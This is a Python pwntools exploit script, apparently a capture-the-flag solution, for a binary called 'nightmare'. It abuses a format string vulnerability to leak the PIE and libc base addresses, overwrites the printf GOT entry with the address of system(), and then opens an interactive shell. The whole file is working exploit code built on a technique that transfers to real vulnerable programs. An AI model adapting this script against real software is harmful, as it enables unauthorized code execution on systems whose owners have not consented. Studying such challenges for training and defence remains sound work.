from pwn import *
import exploit_helper


# Specify GDB script here (breakpoints etc.)
gdb_script = '''
piebase
breakrva 0x14de
continue
'''.format(**locals())

# Binary filename
exe = './nightmare'

# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)


def send_payload_scream(payload):
    io.sendlineafter('>', '1')
    io.sendlineafter('>', payload)
    io.recvuntil('> ')
    return io.recvline().strip()


def send_payload_escape(payload):
    io.sendlineafter('>', '2')
    io.sendlineafter('>', payload)
    io.recvuntil('> ')
    ret = io.recvline().strip()

    info('Payload length: %d', len(payload))
    if len(payload) >= 5:
        fix_input_bug()

    return ret


def fix_input_bug():
    io.sendlineafter('>', '222')
    io.recvuntil('> ')
    io.recvuntil('> ')


# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

io = exploit_helper.start(exe=exe, gdb_script=gdb_script)

# Set up format string
format_string = FmtStr(execute_fmt=send_payload_scream)
info('Format string offset: %d', format_string.offset)

# Leak PIE base
leaked_address = int(send_payload_escape('%{}$p'.format(9)), 16)
info('Leaked address: %#x', leaked_address)

elf.address = leaked_address - 0x14d5
info('PIE base: %#x', elf.address)

# Leak Libc offset
start_main_address = int(send_payload_escape('%{}$p'.format(13)), 16) - 205
info('Leaked libc_start_main address: %#x', start_main_address)

libc_base_address = start_main_address - 0x27730
info('Leaked libc base address: %#x', libc_base_address)

system_address = libc_base_address + 0x49860
info('Leaked system function address: %#x', system_address)

got_printf_address = elf.address + 0x3568
info('Leaked GOT printf address: %#x', got_printf_address)

format_string.write(got_printf_address, system_address)
format_string.execute_writes()

# Got Shell?
io.interactive()

# Or, Get our flag!
# flag = io.recv()
# success(flag)
